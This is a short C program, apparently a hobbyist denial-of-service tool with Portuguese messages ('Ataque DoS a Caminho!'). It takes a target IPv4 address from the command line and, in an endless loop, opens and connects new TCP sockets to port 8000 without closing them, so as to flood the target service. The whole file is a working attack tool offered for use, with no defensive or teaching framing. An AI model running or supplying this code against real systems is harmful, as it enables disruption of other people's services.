#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

int main(int argc, char *argv[]){
	
	int mysocket;
	int conecta;
	int porta;
	char *destino;

	destino = argv[1];
	porta = 8000;
	

	if(argc <2){
		printf("Utilizacao DoS: {IPV4}");
		return 0;
	} else {
		struct sockaddr_in alvo;
		while (true){
			mysocket = socket(AF_INET,SOCK_STREAM,0);
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons (porta);
			alvo.sin_addr.s_addr = inet_addr(destino);

			conecta = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);

			if(conecta == 0) {
				printf("Ataque DoS a Caminho! Servico afetado na porta %d\n", porta);
			
			} else {
				printf("Error");
			}
		
		}
	}

}
